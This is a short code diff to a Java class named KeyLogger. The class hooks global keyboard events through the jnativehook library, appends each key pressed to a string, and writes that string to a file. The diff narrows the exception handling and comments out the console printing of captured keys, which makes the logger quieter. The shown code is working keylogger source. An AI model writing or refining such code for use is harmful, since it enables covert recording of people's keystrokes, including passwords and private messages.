@@ -1,5 +1,7 @@
 import java.io.FileInputStream;
+import java.io.FileNotFoundException;
 import java.io.FileOutputStream;
+import java.io.IOException;
 
 import com.github.kwhat.jnativehook.GlobalScreen;
 import com.github.kwhat.jnativehook.NativeHookException;
@@ -31,8 +33,10 @@ public class KeyLogger implements NativeKeyListener {
                 str += (char) i;
             }
             fin.close();
-        } catch (Exception e) {
+        } catch (FileNotFoundException e) {
             System.out.println(e);
+        } catch (IOException e) {
+            e.printStackTrace();
         }
     }
 
@@ -132,15 +136,17 @@ public class KeyLogger implements NativeKeyListener {
     @Override
     public void nativeKeyPressed(NativeKeyEvent arg0) {
         str += ConvertKey(NativeKeyEvent.getKeyText(arg0.getKeyCode()));
-        System.out.println(str);
+        // System.out.println(str);
         FileOutputStream fout = null;
         try {
             fout = new FileOutputStream(path);
             byte b[] = str.getBytes();
             fout.write(b);
             fout.close();
-        } catch (Exception e) {
+        } catch (FileNotFoundException e) {
             System.out.println(e);
+        } catch (IOException e) {
+            e.printStackTrace();
         }
     }
 
